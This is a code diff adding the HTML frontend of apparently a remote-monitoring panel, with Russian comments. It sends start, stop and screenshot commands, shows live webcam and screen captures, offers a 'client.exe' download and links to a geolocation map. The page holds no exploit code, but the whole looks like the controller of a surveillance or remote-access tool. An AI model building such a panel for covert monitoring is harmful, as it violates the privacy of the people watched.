@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Live Stream</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #videoStream, #screenshotStream {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+        #serverTime {
+            font-weight: bold;
+            color: #333;
+        }
+        .controls {
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Live Video Stream</h1>
+    <div class="controls">
+        <button onclick="sendCommand('start')">Start Streaming</button>
+        <button onclick="sendCommand('stop')">Stop Streaming</button>
+        <button onclick="sendCommand('screenshot')">Take Screenshot</button>
+        <button id="download" onclick="downloadClient()">Download Client</button>
+        <!-- Кнопка перенаправляет на /map, где происходит геокодирование и редирект -->
+        <button onclick="window.location.href='/map'">Show on the Map</button>
+    </div>
+    <p>Server time: <span id="serverTime"></span></p>
+    <img id="videoStream" src="/uploads/latest_frame.jpg" alt="Video Stream">
+    <h2>Screenshot</h2>
+    <img id="screenshotStream" src="/uploads/latest_screenshot.jpg" alt="Screenshot Stream">
+  
+    <script>
+        function updateTime() {
+            fetch('/api/time')
+                .then(response => response.text())
+                .then(time => {
+                    document.getElementById("serverTime").innerText = new Date(time).toLocaleString();
+                })
+                .catch(error => console.error("Ошибка получения времени:", error));
+        }
+
+        function updateImage() {
+            document.getElementById('videoStream').src = `/uploads/latest_frame.jpg?t=${Date.now()}`;
+        }
+
+        function updateScreenshot() {
+            document.getElementById('screenshotStream').src = `/uploads/latest_screenshot.jpg?t=${Date.now()}`;
+        }
+
+        function sendCommand(cmd) {
+            fetch(`/command?cmd=${cmd}`)
+                .then(response => response.text())
+                .then(result => { 
+                    alert("Команда отправлена: " + result); 
+                })
+                .catch(error => console.error("Ошибка отправки команды:", error));
+        }
+
+        function downloadClient() {
+            const link = document.createElement('a');
+            link.href = '/uploads/client.exe';
+            link.download = 'client.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        setInterval(() => {
+            updateTime();
+            updateImage();
+            updateScreenshot();
+        }, 1000);
+
+        updateTime();
+        updateImage();
+        updateScreenshot();
+    </script>
+</body>
+</html>
